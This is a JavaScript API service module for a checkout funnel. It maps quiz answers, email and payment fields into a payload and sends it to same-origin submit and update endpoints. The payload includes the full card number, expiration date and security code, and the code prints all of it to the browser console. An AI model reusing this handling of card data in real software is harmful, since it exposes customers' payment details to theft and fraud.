/**
 * API Service for handling user data INSERT and UPDATE operations
 */

const API_BASE_URL = '/api'
const API_INSERT_URL = `${API_BASE_URL}/submit`
const API_UPDATE_URL = `${API_BASE_URL}/update`

/**
 * Maps form data to API payload format
 * @param {Object} form - Form data from FormContext
 * @param {Object} additionalData - Additional data (upsell1, downsell1, upsell2, etc.)
 * @returns {Object} - Mapped payload
 */
function mapFormToApiPayload(form, additionalData = {}) {
  return {
    zip_code: form.zipCode || '',
    question1: form.question1 != null ? String(form.question1) : null,
    question2: form.question2 != null ? String(form.question2) : null,
    question3: form.question3 != null ? String(form.question3) : null,
    question4: form.question4 != null ? String(form.question4) : null,
    question5: form.question5 != null ? String(form.question5) : null,
    question6: form.question6 != null ? String(form.question6) : null,
    final_question: form.finalQuestion != null ? String(form.finalQuestion) : null,
    success_continue: Boolean(form.successContinue),
    success_proceed_now: Boolean(form.successProceedNow),
    email: form.email || '',
    payment_method: form.paymentMethod || 'credit',
    card_number: form.cardNumber || '',
    expiration_date: form.expirationDate || '',
    security_code: form.securityCode || '',
    cardholder_name: form.cardholderName || '',
    customer_name: form.cardholderName || '',  // Add customer_name field
    country: form.country || 'India',
    postal_code: form.postalCode || '',
    order_bump_instant_access: Boolean(form.upsellInstant),
    order_bump_additional_states: Boolean(form.upsellAdditionalStates),
    terms_accepted: Boolean(form.termsAccepted),
    upsell1: additionalData.upsell1 !== undefined ? additionalData.upsell1 : null,
    downsell1: additionalData.downsell1 !== undefined ? additionalData.downsell1 : null,
    upsell2: additionalData.upsell2 !== undefined ? additionalData.upsell2 : null,
    current_step: additionalData.current_step || 10,
    user_agent: navigator.userAgent,
    ip: additionalData.ip || '',
  }
}

/**
 * Insert new user data into database
 * @param {Object} formData - Form data from FormContext
 * @returns {Promise<Object>} - API response with user ID
 */
export async function insertUserData(formData) {
  const payload = mapFormToApiPayload(formData, { current_step: 10 })

  console.log('[API Service] Inserting user data:', payload)
  console.log('[API Service] INSERT URL:', API_INSERT_URL)

  try {
    const res = await fetch(API_INSERT_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    })

    console.log('[API Service] INSERT Response Status:', res.status, res.statusText)

    if (!res.ok) {
      const errorText = await res.text().catch(() => 'Unknown error')
      console.error('[API Service] INSERT Error Response:', errorText)
      throw new Error(`Insert failed (${res.status}): ${errorText}`)
    }

    const responseText = await res.text()
    console.log('[API Service] INSERT Raw Response:', responseText)
    
    let response
    try {
      response = JSON.parse(responseText)
    } catch (e) {
      console.warn('[API Service] Response is not JSON, treating as text')
      response = { raw: responseText }
    }

    console.log('[API Service] Insert successful:', response)
    
    // Extract user ID from various possible response formats
    let userId = null
    if (response.id) {
      userId = response.id
    } else if (response.data && response.data.id) {
      userId = response.data.id
    } else if (response.user_id) {
      userId = response.user_id
    } else if (response.userId) {
      userId = response.userId
    } else if (response.insertId) {
      userId = response.insertId
    }

    console.log('[API Service] Extracted User ID:', userId)
    
    return {
      ...response,
      id: userId
    }
  } catch (error) {
    console.error('[API Service] INSERT Exception:', error)
    throw error
  }
}

/**
 * Update existing user data
 * @param {number|string} userId - User ID from initial insert
 * @param {Object} updateData - Data to update
 * @returns {Promise<Object>} - API response
 */
export async function updateUserData(userId, updateData) {
  if (!userId) {
    console.error('[API Service] UPDATE Failed: No user ID provided')
    throw new Error('User ID is required for update')
  }

  console.log('[API Service] Updating user data:', { userId, updateData })
  console.log('[API Service] UPDATE URL:', `${API_UPDATE_URL}/${userId}`)

  try {
    const res = await fetch(`${API_UPDATE_URL}/${userId}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(updateData),
    })

    console.log('[API Service] UPDATE Response Status:', res.status, res.statusText)

    if (!res.ok) {
      const errorText = await res.text().catch(() => 'Unknown error')
      console.error('[API Service] UPDATE Error Response:', errorText)
      throw new Error(`Update failed (${res.status}): ${errorText}`)
    }

    const responseText = await res.text()
    console.log('[API Service] UPDATE Raw Response:', responseText)
    
    let response
    try {
      response = JSON.parse(responseText)
    } catch (e) {
      console.warn('[API Service] Response is not JSON, treating as text')
      response = { raw: responseText, success: true }
    }

    console.log('[API Service] Update successful:', response)
    return response
  } catch (error) {
    console.error('[API Service] UPDATE Exception:', error)
    throw error
  }
}

/**
 * Submit complete form data (legacy function for compatibility)
 * @param {Object} formData - Form data
 * @param {Object} additionalData - Additional upsell/downsell data
 * @returns {Promise<Object>}
 */
export async function submitForm(formData, additionalData = {}) {
  const payload = mapFormToApiPayload(formData, additionalData)

  const res = await fetch(API_INSERT_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  })

  if (!res.ok) {
    const errorText = await res.text().catch(() => 'Unknown error')
    throw new Error(`Submission failed (${res.status}): ${errorText}`)
  }

  return res.json()
}

